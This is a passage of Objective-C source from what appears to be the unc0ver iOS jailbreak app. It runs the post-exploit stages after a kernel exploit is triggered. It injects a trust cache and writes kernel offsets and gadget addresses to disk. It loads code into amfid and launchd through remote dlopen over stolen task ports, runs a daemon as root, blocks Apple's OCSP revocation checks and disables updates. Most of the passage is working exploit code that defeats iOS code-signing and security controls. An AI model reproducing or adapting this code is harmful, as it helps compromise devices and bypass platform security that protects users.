            LOG("Successfully disallowed SpringBoard to show non-default system apps.");
            
            // Disable RootFS Restore.
            
            LOG("Disabling RootFS Restore...");
            SETMESSAGE(NSLocalizedString(@"Failed to disable RootFS Restore.", nil));
            [[[NSUserDefaults alloc] initWithUser:@"mobile"] setObject:@NO forKey:@K_RESTORE_ROOTFS inDomain:PREFERENCES_FILE];
            LOG("Successfully disabled RootFS Restore.");
            
            // Reboot.
            
            LOG("Rebooting...");
            SETMESSAGE(NSLocalizedString(@"Failed to reboot.", nil));
            NOTICE(NSLocalizedString(@"RootFS has successfully been restored. The device will be restarted.", nil), true, false);
            _assert(reboot(RB_QUICK) == ERR_SUCCESS, message, true);
            LOG("Successfully rebooted.");
        }
    }
    
    UPSTAGE();
    
    {
        // Inject trust cache
        
        LOG("Injecting trust cache...");
        SETMESSAGE(NSLocalizedString(@"Failed to inject trust cache.", nil));
        LOG("trust_chain = 0x%llx\n", GETOFFSET(trust_chain));
        NSArray *resources = nil;
        if (needResources) {
            resources = @[@(amfid_payload)];
        } else {
            resources = [NSArray arrayWithContentsOfFile:@"/usr/share/undecimus/injectme.plist"];
        }
        if (cdhashFor(@"/usr/libexec/substrate") != nil) {
            resources = [resources arrayByAddingObject:@"/usr/libexec/substrate"];
        }
        _assert(injectTrustCache(resources, GETOFFSET(trust_chain)) == ERR_SUCCESS, message, true);
        LOG("Successfully injected trust cache.");
    }
    UPSTAGE();
    
    {
        // Log slide.
        
        LOG("Logging slide...");
        SETMESSAGE(NSLocalizedString(@"Failed to log slide.", nil));
        NSData *fileData = [[NSString stringWithFormat:@(ADDR "\n"), kernel_slide] dataUsingEncoding:NSUTF8StringEncoding];
        _assert(fileData != nil, message, false);
        _assert(create_file_data("/var/tmp/slide.txt", 0, 0644, fileData), message, false);
        LOG("Successfully logged slide.");
    }
    
    UPSTAGE();
    
    {
        // Log ECID.
        
        LOG("Logging ECID...");
        SETMESSAGE(NSLocalizedString(@"Failed to log ECID.", nil));
        CFStringRef value = MGCopyAnswer(kMGUniqueChipID);
        LOG("ECID: " "%@" "\n", value);
        _assert(value != nil, message, true);
        [[[NSUserDefaults alloc] initWithUser:@"mobile"] setObject:[NSString stringWithFormat:@"%@", value] forKey:@K_ECID inDomain:PREFERENCES_FILE];
        CFRelease(value);
        LOG("Successfully logged ECID.");
    }
    
    UPSTAGE();
    
    {
        // Log offsets.
        
        LOG("Logging offsets...");
        SETMESSAGE(NSLocalizedString(@"Failed to log offsets.", nil));
        NSMutableDictionary *md = [NSMutableDictionary dictionary];
        md[@"KernelBase"] = ADDRSTRING(kernel_base);
        md[@"KernelSlide"] = ADDRSTRING(kernel_slide);
        md[@"TrustChain"] = ADDRSTRING(GETOFFSET(trust_chain));
        md[@"AmfiCache"] = ADDRSTRING(GETOFFSET(amficache));
        md[@"OSBooleanTrue"] = ADDRSTRING(GETOFFSET(OSBoolean_True));
        md[@"OSBooleanFalse"] = ADDRSTRING(GETOFFSET(OSBoolean_False));
        md[@"OSUnserializeXML"] = ADDRSTRING(GETOFFSET(osunserializexml));
        md[@"Smalloc"] = ADDRSTRING(GETOFFSET(smalloc));
        md[@"AllProc"] = ADDRSTRING(GETOFFSET(allproc));
        md[@"AddRetGadget"] = ADDRSTRING(GETOFFSET(add_x0_x0_0x40_ret));
        md[@"RootVnode"] = ADDRSTRING(GETOFFSET(rootvnode));
        md[@"ZoneMapOffset"] = ADDRSTRING(GETOFFSET(zone_map_ref));
        md[@"VfsContextCurrent"] = ADDRSTRING(GETOFFSET(vfs_context_current));
        md[@"VnodeLookup"] = ADDRSTRING(GETOFFSET(vnode_lookup));
        md[@"VnodePut"] = ADDRSTRING(GETOFFSET(vnode_put));
        md[@"KernProc"] = ADDRSTRING(GETOFFSET(kernproc));
        md[@"KernelTask"] = ADDRSTRING(GETOFFSET(kernel_task));
        md[@"Shenanigans"] = ADDRSTRING(GETOFFSET(shenanigans));
        _assert(([md writeToFile:@"/jb/offsets.plist" atomically:YES]), message, true);
        _assert(init_file("/jb/offsets.plist", 0, 0644), message, true);
        LOG("Successfully logged offsets.");
    }
    
    UPSTAGE();
    
    {
        // Set HSP4.
        
        LOG("Setting HSP4...");
        SETMESSAGE(NSLocalizedString(@"Failed to set HSP4.", nil));
        remap_tfp0_set_hsp4(&tfp0, GETOFFSET(kernel_task), GETOFFSET(zone_map_ref), kernel_base, kernel_slide);
        LOG("Successfully set HSP4.");
    }
    
    UPSTAGE();
    
    {
        // Set Disable Loader.
        LOG("Setting Disable Loader...");
        SETMESSAGE(NSLocalizedString(@"Failed to set Disable Loader.", nil));
        if (prefs.load_tweaks) {
            clean_file("/var/tmp/.substrated_disable_loader");
        } else {
            _assert(create_file("/var/tmp/.substrated_disable_loader", 0, 644), message, true);
        }
        LOG("Successfully set Disable Loader.");
    }
    
    UPSTAGE();
    
    {
        // Patch amfid.
        if (access("/usr/libexec/substrate", F_OK) == ERR_SUCCESS)
        {
            // Run substrate
            LOG("Starting Substrate...");
            SETMESSAGE(NSLocalizedString(@"Failed to start Substrate.", nil));
            _assert(runCommand("/usr/libexec/substrate", NULL) == ERR_SUCCESS, message, false);
        }
        
        LOG("Testing amfid...");
        if (runCommand("/bin/true", NULL) != ERR_SUCCESS) {
            LOG("Patching amfid...");
            SETMESSAGE(NSLocalizedString(@"Failed to patch amfid.", nil));
            _assert(clean_file("/var/tmp/amfid_payload.alive"), message, true);

            pid_t amfidPid = pidOfProcess("/usr/libexec/amfid");
            LOG("amfidPid: " "0x%x" "\n", amfidPid);
            _assert(amfidPid > 1, message, true);
            uint64_t amfidProcAddr = getProcStructForPid(amfidPid);
            LOG("amfidProcAddr: " ADDR "\n", amfidProcAddr);
            _assert(ISADDR(amfidProcAddr), message, true);
            _assert(platformizeProcAtAddr(amfidProcAddr) == ERR_SUCCESS, message, true);
            task_t amfidTaskPort = proc_to_task_port(amfidProcAddr, myProcAddr);
            LOG("amfidTaskPort: " "0x%x" "\n", amfidTaskPort);
            _assert(MACH_PORT_VALID(amfidTaskPort), message, true);
            call_remote(amfidTaskPort, dlopen, 2, REMOTE_CSTRING(amfid_payload), REMOTE_LITERAL(RTLD_NOW));
            _assert(call_remote(amfidTaskPort, dlerror, 0) == ERR_SUCCESS, message, true);
            _assert(waitForFile("/var/tmp/amfid_payload.alive") == ERR_SUCCESS, message, true);
            LOG("Successfully patched amfid.");
        } else {
            LOG("Amfid already patched.");
        }
    }
    
    UPSTAGE();
    
    {
        // Update version string.
        
        if (!isJailbroken()) {
            LOG("Updating version string...");
            SETMESSAGE(NSLocalizedString(@"Failed to update version string.", nil));
            struct utsname u;
            _assert(uname(&u) == ERR_SUCCESS, message, true);
            const char *kernelVersionString = [[NSString stringWithFormat:@"%s %s", u.version, DEFAULT_VERSION_STRING] UTF8String];
            for (int i = 0; !(i >= 5 || strstr(u.version, kernelVersionString) != NULL); i++) {
                _assert(updateVersionString(kernelVersionString, tfp0, kernel_base) == ERR_SUCCESS, message, true);
                _assert(uname(&u) == ERR_SUCCESS, message, true);
            }
            _assert(strstr(u.version, kernelVersionString) != NULL, message, true);
            LOG("Successfully updated version string.");
        }
    }
    
    UPSTAGE();
    
    {
        // Extract bootstrap.
        
        LOG("Extracting bootstrap...");
        SETMESSAGE(NSLocalizedString(@"Failed to extract bootstrap.", nil));
        if (needStrap) {
            NSString *strap_tar = pathForResource(@"strap.tar.lzma");
            _assert(strap_tar != nil, message, true);
            _assert(chdir("/") == ERR_SUCCESS, message, true);
            rv = runCommand("/jb/tar", "--use-compress-program=/jb/lzma", "-xvpkf", [strap_tar UTF8String], NULL);
            _assert(rv == ENOENT || rv == ERR_SUCCESS, message, true);
            rv = system("/usr/libexec/cydia/firmware.sh");
            _assert(WEXITSTATUS(rv) == ERR_SUCCESS, message, true);
            extractResources();
            rv = runCommand("/usr/bin/dpkg", "--configure", "-a", NULL);
            _assert(WEXITSTATUS(rv) == ERR_SUCCESS, message, true);
            prefs.run_uicache = true;
            clean_file("/jb/tar");
            clean_file("/jb/lzma");
        } else {
            if (!needResources) {
                updatedResources = compareInstalledVersion("science.xnu.undecimus.resources", "lt", [BUNDLEDRESOURCES UTF8String]);
            }
            if (needResources || updatedResources) {
                extractResources();
            }
        }
        if (access("/.installed_unc0ver", F_OK) != ERR_SUCCESS) {
            _assert(create_file("/.installed_unc0ver", 0, 0644), message, true);
        }
        _assert(chdir("/jb") == ERR_SUCCESS, message, true);
        char link[0x100];
        bzero(link, sizeof(link));
        if ((readlink("/electra", link, 0x9f) == -1) ||
            (strcmp(link, "/jb") != ERR_SUCCESS)) {
            clean_file("/electra");
            symlink("/jb", "/electra");
        }
        if ((readlink("/.bootstrapped_electra", link, 0x9f) == -1) ||
            (strcmp(link, "/.installed_unc0ver") != ERR_SUCCESS)) {
            clean_file("/.bootstrapped_electra");
            symlink("/.installed_unc0ver", "/.bootstrapped_electra");
        }
        if ((readlink("/electra/libjailbreak.dylib", link, 0x9f) == -1) ||
            (strcmp(link, "/usr/lib/libjailbreak.dylib") != ERR_SUCCESS)) {
            clean_file("/electra/libjailbreak.dylib");
            symlink("/usr/lib/libjailbreak.dylib", "/electra/libjailbreak.dylib");
        }
        LOG("Successfully extracted bootstrap.");
    }
    
    UPSTAGE();
    
    {
        if (access("/.cydia_no_stash", F_OK) != ERR_SUCCESS) {
            // Disable stashing.
            
            LOG("Disabling stashing...");
            SETMESSAGE(NSLocalizedString(@"Failed to disable stashing.", nil));
            _assert(create_file("/.cydia_no_stash", 0, 0644), message, true);
            LOG("Successfully disabled stashing.");
        }
    }
    
    UPSTAGE();
    
    {
        // Verify filesystem.
        LOG("Verifying filesystem...");
        SETMESSAGE(NSLocalizedString(@"Failed to verify filesystem.", nil));
        if (!is_directory("/Library/Caches")) {
            LOG("/Library/Caches is not a directory... removing");
            _assert(clean_file("/Library/Caches"), NSLocalizedString(@"Unable to clean invalid file at /Library/Caches", nil), true);
        }
        if (access("/Library/Caches", F_OK) != ERR_SUCCESS) {
            LOG("/Library/Caches is missing... recreating");
            _assert(mkdir("/Library/Caches", S_ISVTX | S_IRWXU | S_IRWXG | S_IRWXO) == ERR_SUCCESS, NSLocalizedString(@"Unable to mkdir /Library/Caches", nil), false);
        }
        if (!mode_is("/Library/Caches", S_IFDIR | S_ISVTX | S_IRWXU | S_IRWXG | S_IRWXO)) {
            LOG(@"Modes on /Library/Caches are wrong... fixing");
            _assert(init_file("/Library/Caches", 0, S_ISVTX | S_IRWXU | S_IRWXG | S_IRWXO), NSLocalizedString(@"Unable to set modes on /Library/Caches", nil), false);
        }
        LOG("Successfully verified filesystem.");
    }
    
    UPSTAGE();
    
    {
        // Spawn jailbreakd.
        
        if (access("/usr/libexec/jailbreakd", F_OK) == ERR_SUCCESS && // jailbreakd must exist
            access("/.disable_jailbreakd", F_OK) != ERR_SUCCESS && // we've not been told to disable it
            access("/usr/libexec/substrate", F_OK) != ERR_SUCCESS) { // substrate must not be installed
            LOG("Spawning jailbreakd...");
            SETMESSAGE(NSLocalizedString(@"Failed to spawn jailbreakd.", nil));
            const char *jbdPidFile = "/var/tmp/jailbreakd.pid";
            if (!pidFileIsValid(@(jbdPidFile))) {
                NSMutableDictionary *md = [NSMutableDictionary dictionary];
                md[@"Label"] = @"jailbreakd";
                md[@"Program"] = @"/usr/libexec/jailbreakd";
                md[@"EnvironmentVariables"] = [NSMutableDictionary dictionary];
                md[@"EnvironmentVariables"][@"KernelBase"] = ADDRSTRING(kernel_base);
                md[@"EnvironmentVariables"][@"KernProcAddr"] = ADDRSTRING(ReadKernel64(GETOFFSET(kernproc)));
                md[@"EnvironmentVariables"][@"ZoneMapOffset"] = ADDRSTRING(GETOFFSET(zone_map_ref) - kernel_slide);
                md[@"EnvironmentVariables"][@"AddRetGadget"] = ADDRSTRING(GETOFFSET(add_x0_x0_0x40_ret));
                md[@"EnvironmentVariables"][@"OSBooleanTrue"] = ADDRSTRING(GETOFFSET(OSBoolean_True));
                md[@"EnvironmentVariables"][@"OSBooleanFalse"] = ADDRSTRING(GETOFFSET(OSBoolean_False));
                md[@"EnvironmentVariables"][@"OSUnserializeXML"] = ADDRSTRING(GETOFFSET(osunserializexml));
                md[@"EnvironmentVariables"][@"Smalloc"] = ADDRSTRING(GETOFFSET(smalloc));
                md[@"UserName"] = @"root";
                md[@"MachServices"] = [NSMutableDictionary dictionary];
                md[@"MachServices"][@"zone.sparkes.jailbreakd"] = [NSMutableDictionary dictionary];
                md[@"MachServices"][@"zone.sparkes.jailbreakd"][@"HostSpecialPort"] = @15;
                md[@"RunAtLoad"] = @YES;
                md[@"KeepAlive"] = @YES;
                md[@"StandardErrorPath"] = @"/var/log/jailbreakd-stderr.log";
                md[@"StandardOutPath"] = @"/var/log/jailbreakd-stdout.log";
                _assert(([md writeToFile:@"/jb/jailbreakd.plist" atomically:YES]), message, true);
                _assert(init_file("/jb/jailbreakd.plist", 0, 0644), message, true);
                _assert(clean_file("/var/log/jailbreakd-stderr.log"), message, true);
                _assert(clean_file("/var/log/jailbreakd-stdout.log"), message, true);
                _assert(clean_file(jbdPidFile), message, true);
                // Stop first in case it was already running
                runCommand("/bin/launchctl", "stop", "jailbreakd", NULL);
                _assert(runCommand("/bin/launchctl", "load", "/jb/jailbreakd.plist", NULL) == ERR_SUCCESS, message, true);
                _assert(waitForFile(jbdPidFile) == ERR_SUCCESS, message, true);
                _assert(pidFileIsValid(@(jbdPidFile)), message, true);
                LOG("Successfully spawned jailbreakd.");
            } else {
                LOG("Jailbreakd already running.");
            }
        } else {
            _assert(clean_file("/jb/jailbreakd.plist"), message, true);
        }
    }
    
    UPSTAGE();
    
    {
        // Patch launchd.
        const pid_t launchdPid = 1;

        if (prefs.load_tweaks && (access("/usr/libexec/substrate", F_OK) != ERR_SUCCESS) && !pspawnHookLoaded()) {
            LOG("Patching launchd...");
            SETMESSAGE(NSLocalizedString(@"Failed to patch launchd.", nil));
            _assert(clean_file("/var/log/pspawn_hook_launchd.log"), message, true);
            _assert(clean_file("/var/log/pspawn_hook_xpcproxy.log"), message, true);
            _assert(clean_file("/var/log/pspawn_hook_other.log"), message, true);

            uint64_t launchdProcAddr = getProcStructForPid(launchdPid);
            LOG("launchdProcAddr: " ADDR "\n", launchdProcAddr);
            _assert(ISADDR(launchdProcAddr), message, true);
            _assert(platformizeProcAtAddr(launchdProcAddr) == ERR_SUCCESS, message, true);
            task_t launchdTaskPort = proc_to_task_port(launchdProcAddr, myProcAddr);
            LOG("launchdTaskPort: " "0x%x" "\n", launchdTaskPort);
            _assert(MACH_PORT_VALID(launchdTaskPort), message, true);
            call_remote(launchdTaskPort, dlopen, 2, REMOTE_CSTRING("/usr/lib/pspawn_hook.dylib"), REMOTE_LITERAL(RTLD_NOW));
            _assert(call_remote(launchdTaskPort, dlerror, 0) == ERR_SUCCESS, message, true);
            LOG("Successfully patched launchd.");
        } else {
            LOG("Not injecting to launchd.");
        }
    }
    
    UPSTAGE();
    
    {
        if (prefs.disable_app_revokes) {
            // Disable app revokes.
            LOG("Disabling app revokes...");
            SETMESSAGE(NSLocalizedString(@"Failed to disable app revokes.", nil));
            blockDomainWithName("ocsp.apple.com");
            clean_file("/var/Keychains/ocspcache.sqlite3");
            symlink("/dev/null", "/var/Keychains/ocspcache.sqlite3");
            clean_file("/var/Keychains/ocspcache.sqlite3-shm");
            symlink("/dev/null", "/var/Keychains/ocspcache.sqlite3-shm");
            clean_file("/var/Keychains/ocspcache.sqlite3-wal");
            symlink("/dev/null", "/var/Keychains/ocspcache.sqlite3-wal");
            LOG("Successfully disabled app revokes.");
        } else {
            // Enable app revokes.
            LOG("Enabling app revokes...");
            SETMESSAGE(NSLocalizedString(@"Failed to enable app revokes.", nil));
            unblockDomainWithName("ocsp.apple.com");
            LOG("Successfully enabled app revokes.");
        }
    }
    
    UPSTAGE();
    
    {
        // Allow SpringBoard to show non-default system apps.
        
        LOG("Allowing SpringBoard to show non-default system apps...");
        SETMESSAGE(NSLocalizedString(@"Failed to allow SpringBoard to show non-default system apps.", nil));
        NSMutableDictionary *md = [NSMutableDictionary dictionaryWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
        _assert(md != nil, message, true);
        for (int i = 0; !(i >= 5 || [md[@"SBShowNonDefaultSystemApps"] isEqual:@YES]); i++) {
            _assert(kill(pidOfProcess("/usr/sbin/cfprefsd"), SIGSTOP) == ERR_SUCCESS, message, true);
            md[@"SBShowNonDefaultSystemApps"] = @YES;
            _assert(([md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES]), message, true);
            _assert(kill(pidOfProcess("/usr/sbin/cfprefsd"), SIGCONT) == ERR_SUCCESS, message, true);
            md = [NSMutableDictionary dictionaryWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
            _assert(md != nil, message, true);
        }
        _assert([md[@"SBShowNonDefaultSystemApps"] isEqual:@YES], message, true);
        LOG("Successfully allowed SpringBoard to show non-default system apps.");
    }
    
    UPSTAGE();
    
    {
        // Fix Auto Updates.
        
        LOG("Fixing Auto Updates...");
        SETMESSAGE(NSLocalizedString(@"Failed to fix auto updates.", nil));
        if (access("/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/softwareupdated", F_OK) == ERR_SUCCESS) {
            _assert(rename("/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/softwareupdated", "/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/Support/softwareupdated") == ERR_SUCCESS, message, false);
        }
        if (access("/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/softwareupdateservicesd", F_OK) == ERR_SUCCESS) {
            _assert(rename("/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/softwareupdateservicesd", "/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/Support/softwareupdateservicesd") == ERR_SUCCESS, message, false);
        }
        if (access("/System/Library/com.apple.mobile.softwareupdated.plist", F_OK) == ERR_SUCCESS) {
            _assert(rename("/System/Library/com.apple.mobile.softwareupdated.plist", "/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist") == ERR_SUCCESS, message, false);
            _assert(runCommand("/bin/launchctl", "load", "/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist", NULL) == ERR_SUCCESS, message, false);
        }
        if (access("/System/Library/com.apple.softwareupdateservicesd.plist", F_OK) == ERR_SUCCESS) {
            _assert(rename("/System/Library/com.apple.softwareupdateservicesd.plist", "/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist") == ERR_SUCCESS, message, false);
            _assert(runCommand("/bin/launchctl", "load", "/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist", NULL) == ERR_SUCCESS, message, false);
        }
        LOG("Successfully fixed Auto Updates.");
    }
    
    UPSTAGE();
    
    {
        if (prefs.disable_auto_updates) {
            // Disable Auto Updates.
            
            LOG("Disabling Auto Updates...");
            SETMESSAGE(NSLocalizedString(@"Failed to disable auto updates.", nil));
            clean_file("/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate");
            symlink("/dev/null", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate");
            clean_file("/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation");
            symlink("/dev/null", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation");
            clean_file("/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdate");
            symlink("/dev/null", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdate");
            clean_file("/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdateDocumentation");
            symlink("/dev/null", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdateDocumentation");
            LOG("Successfully disabled Auto Updates.");
        } else {
            // Enable Auto Updates.
            
            LOG("Enabling Auto Updates...");
            SETMESSAGE(NSLocalizedString(@"Failed to enable auto updates.", nil));
            clean_file("/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate");
            runCommand("/bin/mkdir", "-p", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate", NULL);
            runCommand("/usr/sbin/chown", "root:wheel", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate", NULL);
            clean_file("/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation");
            runCommand("/bin/mkdir", "-p", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation", NULL);
            runCommand("/usr/sbin/chown", "root:wheel", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation", NULL);
            clean_file("/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdate");
            runCommand("/bin/mkdir", "-p", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdate", NULL);
            runCommand("/usr/sbin/chown", "root:wheel", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdate", NULL);
            clean_file("/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdateDocumentation");
            runCommand("/bin/mkdir", "-p", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdateDocumentation", NULL);
            runCommand("/usr/sbin/chown", "root:wheel", "/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdateDocumentation", NULL);
        }
    }
    
    UPSTAGE();
    
    {
        if (prefs.increase_memory_limit) {
            // Increase memory limit.
            
            LOG("Increasing memory limit...");
            SETMESSAGE(NSLocalizedString(@"Failed to increase memory limit.", nil));
            char buf_targettype[256];
            bzero(buf_targettype, sizeof(buf_targettype));
            size_t size = sizeof(buf_targettype);
            _assert(sysctlbyname("hw.targettype", buf_targettype, &size, NULL, 0) == ERR_SUCCESS, message, true);
            NSMutableDictionary *md = [NSMutableDictionary dictionaryWithContentsOfFile:[NSString stringWithFormat:@"/System/Library/LaunchDaemons/com.apple.jetsamproperties.%s.plist", buf_targettype]];
            _assert(md != nil, message, true);
            md[@"Version4"][@"System"][@"Override"][@"Global"][@"UserHighWaterMark"] = [NSNumber numberWithInteger:[md[@"Version4"][@"PListDevice"][@"MemoryCapacity"] integerValue]];
            _assert(([md writeToFile:[NSString stringWithFormat:@"/System/Library/LaunchDaemons/com.apple.jetsamproperties.%s.plist", buf_targettype] atomically:YES]), message, true);
            LOG("Successfully increased memory limit.");
        }
    }
    
    UPSTAGE();
    
    {
        if (prefs.install_openssh) {
            // Install OpenSSH.
            LOG("Installing OpenSSH...");
            SETMESSAGE(NSLocalizedString(@"Failed to install OpenSSH.", nil));
            _assert(installDebs(@[@"openssh.deb", @"openssl.deb", @"ca-certificates.deb"], false), message, true);
            LOG("Successfully installed OpenSSH.");
            
            // Disable Install OpenSSH.
            LOG("Disabling Install OpenSSH...");
            SETMESSAGE(NSLocalizedString(@"Failed to disable Install OpenSSH.", nil));
            [[[NSUserDefaults alloc] initWithUser:@"mobile"] setObject:@NO forKey:@K_INSTALL_OPENSSH inDomain:PREFERENCES_FILE];
            LOG("Successfully disabled Install OpenSSH.");
        }
    }
    
    UPSTAGE();
    
    {
        if (debIsInstalled("cydia-gui")) {
            // Remove Electra's Cydia.
            LOG("Removing Electra's Cydia...");
            SETMESSAGE(NSLocalizedString(@"Failed to remove Electra's Cydia.", nil));
            rv = runCommand("/usr/bin/dpkg", "--force-depends", "-r", "cydia-gui", NULL);
            _assert(WEXITSTATUS(rv) == ERR_SUCCESS, message, true);
            if (!prefs.install_cydia) {
                prefs.install_cydia = true;
                [[[NSUserDefaults alloc] initWithUser:@"mobile"] setObject:@YES forKey:@K_INSTALL_CYDIA inDomain:PREFERENCES_FILE];
            }
            LOG("Successfully removed Electra's Cydia.");
        }
        if (access("/etc/apt/sources.list.d/electra.list", F_OK) == ERR_SUCCESS) {
            if (!prefs.install_cydia) {
                prefs.install_cydia = true;
                [[[NSUserDefaults alloc] initWithUser:@"mobile"] setObject:@YES forKey:@K_INSTALL_CYDIA inDomain:PREFERENCES_FILE];
            }
        }
        if (compareInstalledVersion("mobilesubstrate", "eq", "99.0")) {
            LOG("Fixing version of Electra's mobilesubstrate dummy package.");
            _assert(installDeb("substrate-dummy.deb", true), message, false);
        }
        // This is not a stock file for iOS11+
        runCommand("/bin/sed", "-ie", "/^\\/sbin\\/fstyp/d", "/Library/dpkg/info/firmware-sbin.list", NULL);
        // Unblock Saurik's repo if it is blocked.
        unblockDomainWithName("apt.saurik.com");
        if (prefs.install_cydia) {
            // Install Cydia.
            
            LOG("Installing Cydia...");
            SETMESSAGE(NSLocalizedString(@"Failed to install Cydia.", nil));
            // Force depends because Sileo breaks this with depending "newer" Cydia
            _assert(installDebs(@[@"cydia.deb", @"cydia-lproj.deb"], true), message, true);
            LOG("Successfully installed Cydia.");
            
            // Disable Install Cydia.
            LOG("Disabling Install Cydia...");
            SETMESSAGE(NSLocalizedString(@"Failed to disable Install Cydia.", nil));
            [[[NSUserDefaults alloc] initWithUser:@"mobile"] setObject:@NO forKey:@K_INSTALL_CYDIA inDomain:PREFERENCES_FILE];
            LOG("Successfully disabled Install Cydia.");
        }
    }
    
    UPSTAGE();
    
    {
        // Flush preference cache.
        
        LOG("Flushing preference cache...");
        SETMESSAGE(NSLocalizedString(@"Failed to flush preference cache.", nil));
        _assert(kill(pidOfProcess("/usr/sbin/cfprefsd"), SIGSTOP) == ERR_SUCCESS, message, true);
        _assert(kill(pidOfProcess("/usr/sbin/cfprefsd"), SIGKILL) == ERR_SUCCESS, message, true);
        LOG("Successfully flushed preference cache.");
    }
    
    UPSTAGE();
    
    {
        if (prefs.load_daemons) {
            // Load Daemons.
            
            LOG("Loading Daemons...");
            SETMESSAGE(NSLocalizedString(@"Failed to load Daemons.", nil));
            system("echo 'really jailbroken';"
                    "shopt -s nullglob;"
                    "for a in /Library/LaunchDaemons/*.plist;"
                        "do echo loading $a;"
                        "launchctl load \"$a\" ;"
                    "done; ");
            system("for file in /etc/rc.d/*; do "
                        "if [[ -x \"$file\" ]]; then "
                            "\"$file\";"
                         "fi;"
                    "done");
            LOG("Successfully loaded Daemons.");
        }
    }
    
    UPSTAGE();
    
    {
        if (prefs.run_uicache) {
            // Run uicache.
            
            LOG("Running uicache...");
            SETMESSAGE(NSLocalizedString(@"Failed to run uicache.", nil));
            _assert(runCommand("/usr/bin/uicache", NULL) == ERR_SUCCESS, message, true);
            [[[NSUserDefaults alloc] initWithUser:@"mobile"] setObject:@NO forKey:@K_REFRESH_ICON_CACHE inDomain:PREFERENCES_FILE];
            LOG("Successfully ran uicache.");
        }
    }
    
    UPSTAGE();
    
    {
        // Drop kernel credentials.
        
        LOG("Dropping kernel credentials...");
        SETMESSAGE(NSLocalizedString(@"Failed to clean up.", nil));
        ShaiHuludProcessAtAddr(myProcAddr, myOriginalCredAddr);
        WriteKernel64(GETOFFSET(shenanigans), Shenanigans);
        setuidProcessAtAddr(0, myProcAddr);
        ShaiHulud2ProcessAtAddr(myProcAddr);
        LOG("Successfully dropped kernel credentials.");
    }
    
    UPSTAGE();
    
    {
        if (prefs.load_tweaks) {
            // Load Tweaks.
            
            LOG("Loading Tweaks...");
            SETMESSAGE(NSLocalizedString(@"Failed to run ldrestart", nil));
            if (prefs.reload_system_daemons) {
                rv = system("nohup bash -c \""
                             "launchctl unload /System/Library/LaunchDaemons/com.apple.backboardd.plist && "
                             "ldrestart ;"
                             "launchctl load /System/Library/LaunchDaemons/com.apple.backboardd.plist"
                             "\" 2>&1 >/dev/null &");
            } else {
                rv = system("launchctl stop com.apple.backboardd");
            }
            _assert(WEXITSTATUS(rv) == ERR_SUCCESS, message, true);
            LOG("Successfully loaded Tweaks.");
        }
    }
}

- (IBAction)tappedOnJailbreak:(id)sender
{
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0ul), ^{
        _assert(BUNDLEDRESOURCES != nil, NSLocalizedString(@"Bundled Resources version missing.", nil), true);
        if (!isSupportedByJailbreak()) {
            PROGRESS(NSLocalizedString(@"Unsupported", nil), false, true);
            return;
        }
        UPSTAGE();
        // Initialize kernel exploit.
        LOG("Initializing kernel exploit...");
        mach_port_t persisted_port = try_restore_port();
        if (MACH_PORT_VALID(persisted_port)) {
            offsets_init();
            prepare_for_rw_with_fake_tfp0(persisted_port);
        } else {
            switch ([[NSUserDefaults standardUserDefaults] integerForKey:@K_EXPLOIT]) {
                case EMPTY_LIST: {
                    vfs_sploit();
                    break;
                }
                    
                case MULTI_PATH: {
                    mptcp_go();
                    break;
                }
                case ASYNC_WAKE: {
                    async_wake_go();
                    break;
                }
                    
                default: {
                    break;
                }
            }
        }
        // Validate TFP0.
        LOG("Validating TFP0...");
        if (MACH_PORT_VALID(tfp0)) {
            LOG("Successfully validated TFP0.");
        } else {
            NOTICE(NSLocalizedString(@"Kernel exploit failed. This is not an error. Tap OK to reboot and try again.", nil), true, false);
            crashKernel();
        }
        // NOTICE(@"Jailbreak succeeded, but still needs a few minutes to respring.", 0, 0);
        exploit(tfp0, (uint64_t)get_kernel_base(tfp0), [[NSUserDefaults standardUserDefaults] dictionaryRepresentation]);
        PROGRESS(NSLocalizedString(@"Jailbroken", nil), false, false);
    });
}

+ (NSURL *)getURLForUserName:(NSString *)userName {
    if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"tweetbot://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"tweetbot:///user_profile/%@", userName]];
    } else if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"twitterrific://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"twitterrific:///profile?screen_name=%@", userName]];
